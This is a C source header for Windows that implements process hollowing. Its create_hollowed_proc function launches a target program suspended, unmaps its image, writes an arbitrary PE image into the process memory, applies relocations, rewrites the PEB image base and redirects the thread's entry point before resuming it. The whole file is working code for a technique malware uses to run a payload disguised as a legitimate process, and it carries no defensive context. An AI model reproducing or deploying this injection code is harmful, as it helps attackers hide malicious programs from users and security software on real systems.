#pragma once
#include "stdafx.h"

#include <Windows.h>
#include <winternl.h>
#include <stddef.h>

typedef NTSTATUS(WINAPI *NtUnmapViewOfSectionFunc)(
	HANDLE ProcessHandle,
	void *BaseAddress
	);

typedef NTSTATUS(WINAPI *NtQueryInformationProcessFunc)(
	void *ProcessHandle,
	DWORD ProcessInformationClass,
	void *ProcessInformation,
	DWORD ProcessInformationLength,
	DWORD *ReturnLength
	);

#define GET_NTHDRS(module) \
	((IMAGE_NT_HEADERS *) \
	((char *)module + ((IMAGE_DOS_HEADER *)module)->e_lfanew))

/* global pointers to "undocumented" apis, set at ph_init */
NtUnmapViewOfSectionFunc pNtUnmapViewOfSection;
NtQueryInformationProcessFunc pNtQueryInformationProcess;

static DWORD rva_to_raw(DWORD rva, const IMAGE_NT_HEADERS *nthdrs)
{
	const IMAGE_SECTION_HEADER *sec_hdr;
	WORD nsections;

	sec_hdr = (IMAGE_SECTION_HEADER *)(nthdrs + 1);
	for (nsections = 0; nsections < nthdrs->FileHeader.NumberOfSections; nsections++) {
		DWORD sec_size;
		sec_size = nsections == nthdrs->FileHeader.NumberOfSections - 1 ?
			sec_hdr->Misc.VirtualSize : (sec_hdr + 1)->VirtualAddress - sec_hdr->VirtualAddress;
		if (rva >= sec_hdr->VirtualAddress &&
			rva < sec_hdr->VirtualAddress + sec_size)
			return sec_hdr->PointerToRawData + (rva - sec_hdr->VirtualAddress);
		++sec_hdr;
	}
	return 0;
}

static const void *get_remote_PEB(HANDLE proc)
{
	PROCESS_BASIC_INFORMATION pbi;
	DWORD ret_len;
	return pNtQueryInformationProcess(proc, ProcessBasicInformation, &pbi,
		sizeof(pbi), &ret_len) == 0 ? pbi.PebBaseAddress : NULL;
}

static int read_pmem_wrap(HANDLE proc, const void *addr, void *buffer, SIZE_T size)
{
	int ret;
	SIZE_T read;
	ret = ReadProcessMemory(proc, addr, buffer, size, &read);
	return ret && read == size;
}

static int write_pmem_wrap(HANDLE proc, void *addr, const void *buffer, SIZE_T size)
{
	int ret;
	SIZE_T written;
	ret = WriteProcessMemory(proc, addr, buffer, size, &written);
	return ret && written == size;
}

#define PEB_BASE_ADDR_OFFSET	8

static int get_remote_base_addr(HANDLE proc, const void *peb_addr, DWORD *base_addr)
{
	return read_pmem_wrap(proc, ((char *)peb_addr + PEB_BASE_ADDR_OFFSET),
		base_addr, sizeof(*base_addr));
}

static int set_remote_base_addr(HANDLE proc, const void *peb_addr, DWORD base_addr)
{
	return write_pmem_wrap(proc, ((char *)peb_addr + PEB_BASE_ADDR_OFFSET),
		&base_addr, sizeof(base_addr));
}

static int get_remote_image_size(HANDLE proc, const void *image_base, DWORD *image_size)
{
	IMAGE_DOS_HEADER doshdr;
	if (!read_pmem_wrap(proc, image_base, &doshdr, sizeof(doshdr)))
		return 0;
	return read_pmem_wrap(proc, ((char *)image_base + doshdr.e_lfanew +
		offsetof(IMAGE_NT_HEADERS, OptionalHeader.SizeOfImage)),
		image_size, sizeof(*image_size));
}

static int dir_exists(const IMAGE_NT_HEADERS *nthdrs, int dir_type)
{
	const IMAGE_DATA_DIRECTORY *dir_entry;
	dir_entry = &nthdrs->OptionalHeader.DataDirectory[dir_type];
	return dir_entry->VirtualAddress != 0 && dir_entry->Size != 0;
}

static int is_relocatable(const IMAGE_NT_HEADERS *nthdrs)
{
	return !(nthdrs->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) &&
		dir_exists(nthdrs, IMAGE_DIRECTORY_ENTRY_BASERELOC);
}

static int copy_headers(HANDLE proc, void *base, const void *src)
{
	const IMAGE_NT_HEADERS *nthdrs;

	nthdrs = GET_NTHDRS(src);
	return write_pmem_wrap(proc, base, src, nthdrs->OptionalHeader.SizeOfHeaders);
}

static int copy_sections(HANDLE proc, void *base, const void *src)
{
	const IMAGE_NT_HEADERS *nthdrs;
	const IMAGE_SECTION_HEADER *sechdr;
	WORD i;

	nthdrs = GET_NTHDRS(src);
	sechdr = (IMAGE_SECTION_HEADER *)(nthdrs + 1);
	for (i = 0; i < nthdrs->FileHeader.NumberOfSections; ++i) {
		void *sec_dest;

		if (sechdr[i].PointerToRawData == 0)
			continue;

		sec_dest = (char *)base + sechdr[i].VirtualAddress;
		if (!write_pmem_wrap(proc, sec_dest,
			(char *)src + sechdr[i].PointerToRawData, sechdr[i].SizeOfRawData))
			return 0;
	}
	return 1;
}

// executable, readable, writable
static DWORD secp2vmemp[2][2][2] = {
	{
		//not executable
		{ PAGE_NOACCESS, PAGE_WRITECOPY },
		{ PAGE_READONLY, PAGE_READWRITE }
	},
	{
		//executable
		{ PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY },
		{ PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE }
	}
};

static DWORD secp_to_vmemp(DWORD secp)
{
	DWORD vmemp;
	int executable, readable, writable;

	executable = (secp & IMAGE_SCN_MEM_EXECUTE) != 0;
	readable = (secp & IMAGE_SCN_MEM_READ) != 0;
	writable = (secp & IMAGE_SCN_MEM_WRITE) != 0;
	vmemp = secp2vmemp[executable][readable][writable];
	if (secp & IMAGE_SCN_MEM_NOT_CACHED)
		vmemp |= PAGE_NOCACHE;
	return vmemp;
}

static int protect_remote_secs(HANDLE proc, void *base, const IMAGE_NT_HEADERS *snthdrs)
{
	IMAGE_SECTION_HEADER *sec_hdr;
	DWORD old_prot, new_prot;
	WORD i;

	/* protect the PE headers */
	VirtualProtectEx(proc, base, snthdrs->OptionalHeader.SizeOfHeaders,
		PAGE_READONLY, &old_prot);

	/* protect the image sections */
	sec_hdr = (IMAGE_SECTION_HEADER *)(snthdrs + 1);
	for (i = 0; i < snthdrs->FileHeader.NumberOfSections; ++i) {
		void *section;
		section = (char *)base + sec_hdr[i].VirtualAddress;
		new_prot = secp_to_vmemp(sec_hdr[i].Characteristics);
		if (!VirtualProtectEx(proc,
			section,
			sec_hdr[i].Misc.VirtualSize,	/* pages affected in the range are changed */
			new_prot,
			&old_prot))
			return 0;
	}
	return 1;
}

/* fix the relocations on a raw file */
static void fix_relocs_raw_hlp(IMAGE_BASE_RELOCATION *base_reloc, DWORD dir_size,
	void *map, DWORD delta)
{
	IMAGE_NT_HEADERS *nthdrs;
	IMAGE_BASE_RELOCATION *cur_reloc, *reloc_end;

	nthdrs = GET_NTHDRS(map);
	cur_reloc = base_reloc;
	reloc_end = (IMAGE_BASE_RELOCATION *)((char *)base_reloc + dir_size);
	while (cur_reloc < reloc_end && cur_reloc->SizeOfBlock) {
		int count;
		WORD *cur_entry;
		void *page_raw;

		count = (cur_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		cur_entry = (WORD *)(cur_reloc + 1);
		page_raw = (char *)map + rva_to_raw(cur_reloc->VirtualAddress, nthdrs);
		while (count--) {
			/* is valid x86 relocation? */
			if (*cur_entry >> 12 == IMAGE_REL_BASED_HIGHLOW)
				*(DWORD_PTR *)((char *)page_raw + (*cur_entry & 0x0fff)) += delta;
			cur_entry++;
		}
		/* advance to the next reloc entry */
		cur_reloc = (IMAGE_BASE_RELOCATION *)((char *)cur_reloc + cur_reloc->SizeOfBlock);
	}
}

static void fix_relocs_raw(void *map, DWORD_PTR dest_addr, DWORD image_base)
{
	/* we need to perform fix ups on the source */
	const IMAGE_NT_HEADERS *nthdrs;
	const IMAGE_DATA_DIRECTORY *reloc_dir_entry;
	IMAGE_BASE_RELOCATION *base_reloc;
	DWORD delta;
	nthdrs = GET_NTHDRS(map);
	reloc_dir_entry = &nthdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	base_reloc = (IMAGE_BASE_RELOCATION *)((char *)map +
		rva_to_raw(reloc_dir_entry->VirtualAddress, nthdrs));
	delta = dest_addr - image_base;
	fix_relocs_raw_hlp(base_reloc, reloc_dir_entry->Size, map, delta);
}

int ph_init(void)
{
	HMODULE ntdll;
	if (!(ntdll = GetModuleHandle(TEXT("ntdll.dll"))))
		return 0;
	return (pNtQueryInformationProcess =
		(NtQueryInformationProcessFunc)GetProcAddress(ntdll, "NtQueryInformationProcess")) &&
		(pNtUnmapViewOfSection =
			(NtUnmapViewOfSectionFunc)GetProcAddress(ntdll, "NtUnmapViewOfSection"));
}

int create_hollowed_proc(const TCHAR *name, TCHAR *cmd_line, void *map)
{
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	const void *peb_addr;
	DWORD_PTR org_base;
	DWORD rimage_size;
	void *dest;
	IMAGE_NT_HEADERS *nthdrs;
	DWORD image_base;
	CONTEXT cntx;
	int res;

	dest = NULL;
	res = 0;

	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	memset(&pinfo, 0, sizeof(pinfo));
	int crProc = CreateProcess(name, cmd_line, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sinfo, &pinfo);
	if (!crProc)
	{
		int err = GetLastError();
		return 0;
	}

	if (!(peb_addr = get_remote_PEB(pinfo.hProcess)) ||
		!get_remote_base_addr(pinfo.hProcess, peb_addr, &org_base) ||
		!get_remote_image_size(pinfo.hProcess, (void *)org_base, &rimage_size))
		goto cleanup;

	nthdrs = GET_NTHDRS(map);
	image_base = nthdrs->OptionalHeader.ImageBase;
	/* no need to unmap if the destination is fit for us
	* commented out because injected process crashes on vista and above
	*/
	/*
	if (image_base == org_base &&
	nthdrs->OptionalHeader.SizeOfImage <= rimage_size) {
	DWORD oldp;

	if(sa->s2.VirtualProtectEx(pinfo.hProcess, (void *)org_base,
	nthdrs->OptionalHeader.SizeOfImage, PAGE_READWRITE, &oldp))
	dest = (void *)org_base;
	}
	*/

	if (!dest) {
		if (is_relocatable(nthdrs)) {
			/* try to map it onto the process's image base */
			if (pNtUnmapViewOfSection(pinfo.hProcess, (void *)org_base) == 0)
				dest = VirtualAllocEx(
					pinfo.hProcess,
					(void *)org_base,
					nthdrs->OptionalHeader.SizeOfImage,
					MEM_RESERVE | MEM_COMMIT,
					PAGE_READWRITE);

			/* if that failed, map it on any other free address space */
			if (!dest && !(dest = VirtualAllocEx(
				pinfo.hProcess,
				NULL,
				nthdrs->OptionalHeader.SizeOfImage,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_READWRITE)))
				goto cleanup;

			/* change the ImageBase before the headers get copied */
			nthdrs->OptionalHeader.ImageBase = (DWORD_PTR)dest;
		}
		else {
			/* tryp to unmap the destination pages, if they exist */
			pNtUnmapViewOfSection(pinfo.hProcess, (void *)image_base);

			/* can only map on the image base if we don't have reloc table */
			if (!(dest = VirtualAllocEx(pinfo.hProcess, (void *)image_base,
				nthdrs->OptionalHeader.SizeOfImage,
				MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
				goto cleanup;
		}
	}

	/* relocated ? */
	if (dest != (void *)image_base)
		fix_relocs_raw(map, (DWORD_PTR)dest, image_base);

	if (!copy_headers(pinfo.hProcess, dest, map) ||
		!copy_sections(pinfo.hProcess, dest, map) ||
		!protect_remote_secs(pinfo.hProcess, dest, nthdrs))
		goto cleanup;

	/* change the imagebase entry on the PEB if it's changed */
	if ((DWORD_PTR)dest != org_base &&
		!set_remote_base_addr(pinfo.hProcess, peb_addr, (DWORD)dest))
		goto cleanup;
	/* resume the suspended process */
	cntx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(pinfo.hThread, &cntx))
		goto cleanup;
	cntx.Eax = (DWORD_PTR)dest + nthdrs->OptionalHeader.AddressOfEntryPoint;
	if (!SetThreadContext(pinfo.hThread, &cntx) ||
		ResumeThread(pinfo.hThread) == (DWORD)-1)
		goto cleanup;
	res = 1;

cleanup:
	if (!res)
		TerminateProcess(pinfo.hProcess, 0);
	CloseHandle(pinfo.hThread);
	CloseHandle(pinfo.hProcess);
	return res;
}
